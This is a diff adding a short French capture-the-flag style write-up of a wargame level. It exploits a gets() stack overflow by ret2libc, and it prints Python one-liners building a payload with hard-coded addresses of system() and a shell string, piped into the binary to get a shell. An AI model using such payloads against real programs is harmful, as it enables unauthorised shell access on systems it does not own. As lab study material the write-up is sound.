@@ -1,0 +1,24 @@
+avec gdb on voit qu'il call gets() avec un buffer sur la stack de taille 50 = overflow possible
+
+on utilise ici un ret2libc pour call une fonction qui nous interesse (ici system("/bin/bash"))
+
+la structure de notre payload doit donc etre :
+BUFFER SUFFISANT POUR ECRASER L'EIP + adresse de system + 4 octets random (adresse de retour de system normalement) + adresse de "/bin/bash"
+
+on voit que "/bin/bash" est presente dans l'env qui est push sur la pile donc on peut utiliser ca
+avec quelques tests avec GDB on obtient ce payload
+
+python -c "print  'o'*76 + '\x60\xb0\xe6\xb7' + '\xef\xbe\xad\xde' + '\x0b\xf9\xff\xbf'" > /tmp/f
+
+on run avec
+cat /tmp/f - | ./level1
+
+on a notre shell !
+sauf que.........on a pas les droits de level2
+
+on essaie un export SHELL=/bin/sh pour tester
+
+on ajuste un peu le payload......
+python -c "print  'o'*76 + '\x60\xb0\xe6\xb7' + '\xef\xbe\xad\xde' + '\x0d\xf9\xff\xbf'" > /tmp/f
+
+ca fonctionne ! :)
